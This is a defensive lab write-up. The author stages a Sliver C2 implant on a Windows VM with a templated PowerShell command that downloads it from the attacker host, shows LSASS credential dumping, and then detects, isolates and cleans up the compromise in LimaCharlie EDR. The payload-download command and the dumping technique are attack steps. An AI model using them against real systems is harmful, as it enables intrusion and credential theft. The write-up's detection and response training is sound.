# LimaCharlie-EDR-Lab
![Architecture](https://i.imgur.com/6mftsEk.jpg)

## Introduction

I simulated a real-life cyber attack scenario and tested the effectiveness of my security measures. I created two virtual machines on a NatNetwork: an Ubuntu Server acting as the attacker, and a Windows 11 machine as the victim.

To enhance the security of the victim machine, I installed LimaCharlie sensor and Sysmon, which helped me detect any potential attacks or security events. On the Ubuntu Server, I installed [Sliver-Server C2](https://bishopfox.com/blog/sliver), a command and control attack tool. I will be conducting a Credential Gathering attack using LSASS.exe to extract usernames and passwords. 

To test my security measures, I executed the C2 attack and created detection rules to alert administrators of any suspicious activity. This lab project aimed to demonstrate the importance of having robust security measures in place to protect against cyber attacks.

The Technologies and Tools used during this project:

* Virtual Box NatNetwork
* Virtual Machines 
  + Windows 11
  + Ubuntu Server 22.04
* LimaCharlieEDR
* Silver Server 

## Labbing

After setting up the environment, the next step involved creating a Sliver-Server C2 implant on the Ubuntu server to be installed on the Windows system.


![Implant](https://i.imgur.com/LEP0qSk.png)


To facilitate the installation process, a quick web server was set up on the Ubuntu machine. This web server would host the C2 payload, allowing it to be easily accessed and downloaded by the Windows device.

On the Windows system, a PowerShell command was executed to initiate the download and save the C2 implant. The specific PowerShell command used was:

![IWR](https://i.imgur.com/dadsDeX.png)

IWR -Uri http://[IpAddress]/[ImplantName] -Outfile [FileLocation]

In this command, [IpAddress] refers to the IP address of the Ubuntu machine hosting the C2 payload, [ImplantName] represents the name of the C2 implant file, and [FileLocation] indicates the desired location on the Windows system where the implant should be saved.

Once the C2 implant is successfully downloaded onto the Windows device, the next step would involve executing the malicious file. This execution grants the C2 infrastructure control over the compromised Windows system, allowing for remote access and potential malicious activities.

![Excute](https://i.imgur.com/mkdYQkp.png)

## After Implant is installed on Victum

We can run some commands inside the sliver-server session itself. 

Jumping inside our our session we can run some commands to identify the device we are on.

Whoami - Hostname

Netstat - Network connections

ps -T - Process Tree (sliver Highlights green its own files)

![Tree](https://i.imgur.com/CfmWUyF.png)


## Inside LimaCharlie EDR

After installing the malicious file we should be able to see this inside of our EDR soultion.

First thing to look at is going to be the processes running. After looking around for some time we see this file that does not have a signature(yellow)

![process](https://i.imgur.com/Pts6px0.png)

After finding that process we can go see that this file location is inside the Downloads folder of a user called Victum so we can locate this inside the filesystem section of LimaCharlie

![filesystem](https://i.imgur.com/ksRCp3P.png)

Now we are going to look at the timeline and go through and see what is going on when this file was installed. 

![timeline](https://i.imgur.com/jYVSaNr.png)

We can see that there is a Network Connetion created and the file in question is COMPLEX_BELL the malicious file. 

Usually a next step would be gathering the hash of the file and running this through VirusTotal but when doing this, VirusTotal returns nothing. This indicates that the attacker crafted this file themselves.  

## Credential Gathering

For attackers getting access to more than one account is critical. A way to do this is gathering creditals from the file lsass.exe. This file holds usernames, passwords and security tokens.

To learn more about LSASS Credential Gathering refer to [Mitre](https://attack.mitre.org/techniques/T1003/001/)

Running this command will copy the contents of the lsass file and dump it inside of the attackers host. 

![lsass-dump](https://i.imgur.com/1TDbDT7.png)

To detect this method of Credential Gathering we will write a detection rule to detect this technique. 

In LimaCharlie we can enter this detection rule: 

![lsass-detection-rule](https://i.imgur.com/6bDKczs.png)

This rule will detect any interaction with the lsass file, so this could cause a lot of False Postives if administrators are using this file. But for this lab it is a good rule since we dont have any actual users. 

Now if we run the lsass dump command again

![lsass-dump](https://i.imgur.com/1TDbDT7.png)

We will be able to detect it inside of LimaCharlie

![Lima-Detections](https://i.imgur.com/mCsvF9u.png)

## Containment & Eradication

First we need to identify if this attack took place on other devices inside the network. Since this lab only has one VM we know that there is only one. Next we should isolate this device from our network to ensure that this attacker can't move around or futher attack our internal network.

![isolate](https://i.imgur.com/E3bqXh9.png)

Then we can either return to a known good snapshot if this is a Virtual Machine. We can also delete the file inside LimaCharlie by going into the filesystem section and finding the malicous file. We will also need to inspect other logs and detections to ensure that no other attacks or malware took place on this device before we put it back on the network. 

The most important part, since this attack was stealing credientials, we need to change passwords, implement MFA and maybe change usernames to ensure the attacker cannot login to other devices or accounts. 

## Conclusion



## Credit

This project was based on a blog post by [Eric Capuano](https://blog.ecapuano.com/p/so-you-want-to-be-a-soc-analyst-intro?sd=pf) 


